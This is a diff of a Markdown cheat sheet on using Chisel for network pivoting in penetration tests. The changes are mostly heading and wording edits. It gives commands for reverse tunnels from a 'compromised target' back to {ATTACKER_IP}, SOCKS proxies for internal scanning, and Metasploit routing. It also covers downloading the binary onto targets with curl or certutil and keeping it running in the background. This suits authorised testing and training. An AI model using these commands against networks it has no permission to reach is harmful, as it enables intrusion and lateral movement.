@@ -1,4 +1,4 @@
-# chisel
+# Chisel - Fast TCP/UDP Tunnel over HTTP
 
 **Author:** Julien Bongars\
 **Date:** 2025-12-30 00:02:04
@@ -6,11 +6,15 @@
 
 ---
 
-TCP/UDP tunnel over HTTP, SSH-encrypted. Used to pivot through firewalls and NAT.
+## Overview
+
+Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It's especially useful for pivoting through firewalls and NAT. Single executable, works on Linux, Windows, and macOS.
+
+**GitHub**: https://github.com/jpillora/chisel
 
 ## Installation
 
-### Download pre-compiled binaries
+### Download Pre-compiled Binaries
 
 ```bash
 # Latest release
@@ -23,7 +27,7 @@ mv chisel_1.9.1_linux_amd64 chisel
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
 ```
 
-### Build from source
+### Build from Source
 
 ```bash
 git clone https://github.com/jpillora/chisel.git
@@ -31,19 +35,23 @@ cd chisel
 go build
 ```
 
-## Basic concepts
+## Basic Concepts
 
-**Server:** Runs on the attacking machine (has a public/accessible IP).
-**Client:** Runs on the compromised target (connects back to the server).
+### Server vs Client
 
-**Forward tunnel (local):** Client forwards a local port to a remote destination.
-**Reverse tunnel (remote):** Server forwards its local port into the client's network.
+- **Server**: Runs on your attacking machine (has public/accessible IP)
+- **Client**: Runs on compromised target machine (connects back to server)
 
-## Common usage patterns
+### Forward vs Reverse
 
-### Reverse tunnel (most common)
+- **Forward Tunnel (Local)**: Client forwards local port to remote destination
+- **Reverse Tunnel (Remote)**: Server forwards its local port to client's network
 
-Compromise a target and reach services on its internal network.
+## Common Usage Patterns
+
+### Pattern 1: Reverse Tunnel (Most Common)
+
+**Scenario**: You compromise a target and want to access services on its internal network.
 
 ```bash
 # On your attacking machine (Server)
@@ -56,9 +64,9 @@ chisel client {ATTACKER_IP}:8000 R:8080:127.0.0.1:80
 curl http://127.0.0.1:8080
 ```
 
-### Forward tunnel
+### Pattern 2: Forward Tunnel
 
-Less common; client needs to reach attacker services.
+**Scenario**: Less common, but useful when client needs to access attacker's services.
 
 ```bash
 # On your attacking machine (Server)
@@ -70,9 +78,9 @@ chisel client {ATTACKER_IP}:8000 8080:127.0.0.1:80
 # Target can now access attacker's localhost:80 via target's localhost:8080
 ```
 
-## Reverse tunnel examples
+## Reverse Tunnel Examples (Most Useful)
 
-### Access internal web service
+### Access Internal Web Service
 
 ```bash
 # Server (Attacker)
@@ -84,7 +92,7 @@ chisel client {ATTACKER_IP}:8000 R:8080:localhost:80
 # Access via browser: http://127.0.0.1:8080
 ```
 
-### Access RDP on internal host
+### Access RDP on Internal Host
 
 ```bash
 # Server (Attacker)
@@ -97,7 +105,7 @@ chisel client {ATTACKER_IP}:8000 R:3389:192.168.1.10:3389
 xfreerdp /v:127.0.0.1:3389 /u:administrator /p:password
 ```
 
-### Access SSH on internal network
+### Access SSH on Internal Network
 
 ```bash
 # Server (Attacker)
@@ -110,7 +118,7 @@ chisel client {ATTACKER_IP}:8000 R:2222:192.168.1.50:22
 ssh user@127.0.0.1 -p 2222
 ```
 
-### Multiple port forwards
+### Multiple Port Forwards
 
 ```bash
 # Server (Attacker)
@@ -120,7 +128,7 @@ chisel server -p 8000 --reverse
 chisel client {ATTACKER_IP}:8000 R:8080:localhost:80 R:3389:192.168.1.10:3389 R:2222:192.168.1.20:22
 ```
 
-### SOCKS5 proxy (dynamic port forwarding)
+### SOCKS5 Proxy (Dynamic Port Forwarding)
 
 ```bash
 # Server (Attacker)
@@ -138,7 +146,7 @@ proxychains nmap -sT 192.168.1.0/24
 proxychains curl http://192.168.1.10
 ```
 
-## Advanced usage
+## Advanced Usage
 
 ### Authentication
 
@@ -150,7 +158,7 @@ chisel server -p 8000 --reverse --auth user:password
 chisel client --auth user:password {ATTACKER_IP}:8000 R:8080:localhost:80
 ```
 
-### Custom SOCKS port
+### Custom SOCKS Port
 
 ```bash
 # Server
@@ -160,7 +168,7 @@ chisel server -p 8000 --reverse
 chisel client {ATTACKER_IP}:8000 R:9050:socks
 ```
 
-### Bind to specific interface
+### Bind to Specific Interface
 
 ```bash
 # Server listening on all interfaces
@@ -170,7 +178,7 @@ chisel server -p 8000 --host 0.0.0.0 --reverse
 chisel server -p 8000 --host 127.0.0.1 --reverse
 ```
 
-### Keep alive settings
+### Keep Alive Settings
 
 ```bash
 # Client with keepalive (useful for unstable connections)
@@ -180,7 +188,7 @@ chisel client --keepalive 25s {ATTACKER_IP}:8000 R:8080:localhost:80
 chisel server -p 8000 --keepalive 25s --reverse
 ```
 
-### Verbose mode (debugging)
+### Verbose Mode (Debugging)
 
 ```bash
 # Server with verbose output
@@ -190,9 +198,9 @@ chisel server -p 8000 --reverse -v
 chisel client -v {ATTACKER_IP}:8000 R:8080:localhost:80
 ```
 
-## File transfer
+## File Transfer Methods
 
-### Transfer to Linux target
+### Transfer to Linux Target
 
 ```bash
 # HTTP Server on attacker
@@ -207,7 +215,7 @@ curl http://{ATTACKER_IP}/chisel -o chisel
 chmod +x chisel
 ```
 
-### Transfer to Windows target
+### Transfer to Windows Target
 
 ```powershell
 # PowerShell download
@@ -220,9 +228,9 @@ certutil -urlcache -f http://{ATTACKER_IP}/chisel.exe C:\Windows\Temp\chisel.exe
 copy \\{ATTACKER_IP}\share\chisel.exe C:\Windows\Temp\
 ```
 
-## Background execution
+## Background Execution
 
-### Linux background
+### Linux Background
 
 ```bash
 # Run in background with nohup
@@ -236,7 +244,7 @@ disown
 screen -dmS chisel ./chisel client {ATTACKER_IP}:8000 R:8080:localhost:80
 ```
 
-### Windows background
+### Windows Background
 
 ```powershell
 # Start as background process
@@ -246,9 +254,9 @@ Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList 
 start /B chisel.exe client {ATTACKER_IP}:8000 R:8080:localhost:80
 ```
 
-## Practical scenarios
+## Practical Scenarios
 
-### Double pivot
+### Scenario 1: Double Pivot
 
 ```bash
 # First pivot (Target A)
@@ -268,7 +276,7 @@ chisel client 127.0.0.1:9001 R:3389:192.168.2.10:3389
 # Now RDP accessible on Attacker at 127.0.0.1:3389
 ```
 
-### Access multiple internal services
+### Scenario 2: Access Multiple Internal Services
 
 ```bash
 # Server on Attacker
@@ -283,7 +291,7 @@ chisel client {ATTACKER_IP}:8000 \
   R:5432:postgres.internal:5432
 ```
 
-### Combine with Metasploit
+### Scenario 3: Combine with Metasploit
 
 ```bash
 # Chisel SOCKS proxy
@@ -304,9 +312,9 @@ run
 route add 192.168.1.0 255.255.255.0 {SESSION_ID}
 ```
 
-## Comparison with SSH tunneling
+## Comparison with SSH Tunneling
 
-### SSH local forward (-L)
+### SSH Local Forward (-L)
 
 ```bash
 # SSH
@@ -317,7 +325,7 @@ chisel server -p 8000 --reverse
 chisel client attacker:8000 R:8080:internal-host:80
 ```
 
-### SSH remote forward (-R)
+### SSH Remote Forward (-R)
 
 ```bash
 # SSH
@@ -328,7 +336,7 @@ chisel server -p 8000
 chisel client external-host:8000 8080:localhost:80
 ```
 
-### SSH dynamic forward (-D)
+### SSH Dynamic Forward (-D)
 
 ```bash
 # SSH
@@ -341,7 +349,7 @@ chisel client attacker:8000 R:socks
 
 ## Troubleshooting
 
-### Connection issues
+### Connection Issues
 
 ```bash
 # Check if server is listening
@@ -355,7 +363,7 @@ ufw allow 8000/tcp
 iptables -A INPUT -p tcp --dport 8000 -j ACCEPT
 ```
 
-### Port already in use
+### Port Already in Use
 
 ```bash
 # Find what's using the port
@@ -369,14 +377,14 @@ kill -9 {PID}
 chisel server -p 8001 --reverse
 ```
 
-### Windows firewall issues
+### Windows Firewall Issues
 
 ```powershell
 # Allow through Windows Firewall
 New-NetFirewallRule -DisplayName "Chisel" -Direction Outbound -Action Allow -Protocol TCP -RemotePort 8000
 ```
 
-### Slow performance
+### Slow Performance
 
 ```bash
 # Increase buffer size
@@ -386,7 +394,7 @@ chisel client --max-retry-count 10 {ATTACKER_IP}:8000 R:8080:localhost:80
 iperf3 -c {ATTACKER_IP}
 ```
 
-## Security notes
+## Security Considerations
 
 - Chisel traffic is encrypted via SSH
 - Always use authentication in production environments
@@ -394,9 +402,9 @@ iperf3 -c {ATTACKER_IP}
 - Monitor for unusual outbound connections on port 8000 (or your chosen port)
 - Clean up chisel binaries after engagement
 
-## Quick reference
+## Quick Reference
 
-### Most common command
+### Most Common Command
 
 ```bash
 # Server (run this first on attacker)
@@ -406,7 +414,7 @@ chisel server -p 8000 --reverse
 chisel client {ATTACKER_IP}:8000 R:{LOCAL_PORT}:{TARGET_HOST}:{TARGET_PORT}
 ```
 
-### SOCKS proxy (scan entire network)
+### SOCKS Proxy (Scan entire network)
 
 ```bash
 # Server
@@ -418,7 +426,3 @@ chisel client {ATTACKER_IP}:8000 R:socks
 # Use with proxychains
 proxychains nmap -sT -Pn 192.168.1.0/24
 ```
-
-## Resources
-
-- [chisel](https://github.com/jpillora/chisel) — releases, `server`/`client` flags, SOCKS
